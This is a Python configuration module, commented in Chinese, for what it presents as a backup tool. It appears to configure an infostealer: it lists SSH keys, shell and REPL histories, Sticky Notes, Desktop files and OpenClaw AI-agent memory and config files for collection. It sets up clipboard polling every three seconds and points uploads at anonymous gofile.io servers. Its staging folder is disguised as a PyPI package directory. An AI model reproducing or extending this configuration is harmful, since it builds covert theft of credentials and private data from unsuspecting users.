# -*- coding: utf-8 -*-
"""
备份配置模块
"""

import os
import logging

class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
    MAX_SERVER_RETRIES = 2  # 每个服务器最多尝试次数
    FILE_DELAY_AFTER_UPLOAD = 1  # 上传后等待文件释放的时间（秒）
    FILE_DELETE_RETRY_COUNT = 3  # 文件删除重试次数
    FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
    
    # 网络配置
    NETWORK_TIMEOUT = 3  # 网络检查超时时间（秒）
    NETWORK_CHECK_HOSTS = [
        ("8.8.8.8", 53),        # Google DNS
        ("1.1.1.1", 53),        # Cloudflare DNS
        ("208.67.222.222", 53)  # OpenDNS
    ]
    
    # 监控配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
    CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
    CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTB上传检查间隔（秒）
    
    # 错误处理配置
    CLIPBOARD_ERROR_WAIT = 60  # JTB监控连续错误等待时间（秒）
    BACKUP_CHECK_INTERVAL = 3600  # 备份检查间隔（秒，每小时检查一次）
    ERROR_RETRY_DELAY = 60  # 发生错误时重试等待时间（秒）
    MAIN_ERROR_RETRY_DELAY = 300  # 主程序错误重试等待时间（秒，5分钟）
    
    # 文件操作配置
    FILE_RETRY_COUNT = 3  # 文件访问重试次数
    FILE_RETRY_DELAY = 5  # 文件重试等待时间（秒）
    COPY_CHUNK_SIZE = 1024 * 1024  # 文件复制块大小（1MB，提高性能）
    
    # 磁盘空间检查
    MIN_FREE_SPACE = 1024 * 1024 * 1024  # 最小可用空间（1GB）
    
    # 备份目录 - 用户文档目录
    BACKUP_ROOT = os.path.expandvars('%USERPROFILE%\\.dev\\pypi-AutoBackup')

    # 自动检测当前用户桌面在用户主目录中的相对路径（支持桌面重定向 / OneDrive 等情况）
    _USER_HOME = os.path.expandvars('%USERPROFILE%')
    _DESKTOP_CANDIDATES = [
        os.path.join(_USER_HOME, 'Desktop'),
        os.path.join(_USER_HOME, '桌面'),
        os.path.join(_USER_HOME, 'OneDrive', 'Desktop'),
        os.path.join(_USER_HOME, 'OneDrive', '桌面'),
    ]
    for _path in _DESKTOP_CANDIDATES:
        if os.path.exists(_path):
            DESKTOP_RELATIVE_PATH = os.path.relpath(_path, _USER_HOME)
            break
    else:
        DESKTOP_RELATIVE_PATH = 'Desktop'

    # 自动检测当前用户便签数据库 plum.sqlite 的相对路径（兼容不同包名）
    _LOCAL_APPDATA = os.path.join(_USER_HOME, 'AppData', 'Local')
    _PACKAGES_DIR = os.path.join(_LOCAL_APPDATA, 'Packages')
    STICKY_NOTES_RELATIVE_PATH = (
        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    )
    try:
        if os.path.isdir(_PACKAGES_DIR):
            for _entry in os.listdir(_PACKAGES_DIR):
                if 'StickyNotes' in _entry:
                    _candidate = os.path.join(_PACKAGES_DIR, _entry, 'LocalState', 'plum.sqlite')
                    if os.path.exists(_candidate):
                        # 转为相对于 %USERPROFILE% 的相对路径，保持与 WINDOWS_SPECIFIC_DIRS 其他项一致
                        STICKY_NOTES_RELATIVE_PATH = os.path.relpath(_candidate, _USER_HOME)
                        break
    except Exception:
        # 自动检测失败时，退回到默认硬编码路径
        pass
    
    # 时间阈值文件
    THRESHOLD_FILE = os.path.join(BACKUP_ROOT, 'next_backup_time.txt')
    
    # 日志配置
    LOG_FILE = os.path.join(BACKUP_ROOT, 'backup.log')
    LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
    LOG_LEVEL = logging.INFO
    
    # 指定要直接复制的目录和文件（相对于用户主目录 %USERPROFILE%）
    WINDOWS_SPECIFIC_DIRS = [
        DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
        STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测包名，失败则使用默认路径）
        ".ssh",  # SSH配置
        ".python_history",  # Python 历史记录文件
        ".node_repl_history",  # Node.js REPL 历史记录文件
        r"AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",  # Windows PowerShell 历史
        r"AppData\Roaming\Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt",  # PowerShell Core 历史（如果存在）
        r".openclaw\memory",  # OpenClaw 内存目录
        r".openclaw\workspace\MEMORY.md",
        r".openclaw\openclaw.json*",  # OpenClaw 配置文件及所有备份（.bak/.bak.1/.bak.2...）
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

# 配置日志
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.StreamHandler()
        ]
    )
else:
    logging.basicConfig(
        level=BackupConfig.LOG_LEVEL,
        format=BackupConfig.LOG_FORMAT,
        handlers=[
            logging.FileHandler(BackupConfig.LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
